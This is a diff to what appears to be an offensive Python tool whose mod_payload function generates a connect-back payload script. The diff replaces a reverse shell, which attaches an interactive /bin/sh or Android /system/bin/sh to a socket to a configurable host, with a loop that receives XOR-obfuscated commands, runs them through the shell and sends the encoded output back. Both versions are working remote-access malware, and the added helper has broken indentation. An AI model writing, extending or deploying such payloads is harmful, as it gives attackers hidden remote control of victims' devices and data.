@@ -8,7 +8,7 @@ try:
 except ImportError:
     _TERMIOS = False
 
-VERSION = "0.3.1"
+VERSION = "0.3.2"
 ROOT = os.path.dirname(os.path.abspath(__file__))
 DATA = os.path.join(ROOT, "data"); os.makedirs(DATA, exist_ok=True)
 CFG = os.path.join(ROOT, "config.json")
@@ -339,13 +339,24 @@ def mod_payload():
         p = f'''#!/usr/bin/env python3
 import socket,subprocess,os,time
 HOST,PORT="{host}",{port}
-def x(b,k): return bytes((x^(i+k)&0xFF) for i,x in enumerate(b))
+def x(b,k): return bytes((x^(i+k)&0xFF for i,x in enumerate(b)))
+def r(s): d=b""
+ while 1:
+  try:
+   x=s.recv(4096)
+   if not x: break
+   d+=x
+   if len(x)<4096: break
+  except: break
+ return d
 while True:
     try:
         s=socket.socket();s.connect((HOST,int(PORT)))
-        os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
-        subprocess.call(["/system/bin/sh","-i"] if os.path.exists("/system/bin/sh") else ["/bin/sh","-i"])
-        s.close()
+        while 1:
+            cmd=s.recv(4096)
+            if not cmd:break
+            c=subprocess.run(x(cmd,1).decode(errors="ignore").strip(),shell=True,capture_output=True,text=True)
+            s.sendall(x((c.stdout+c.stderr).encode()+b"\\n",2))
     except Exception: pass
     time.sleep(5)
 '''
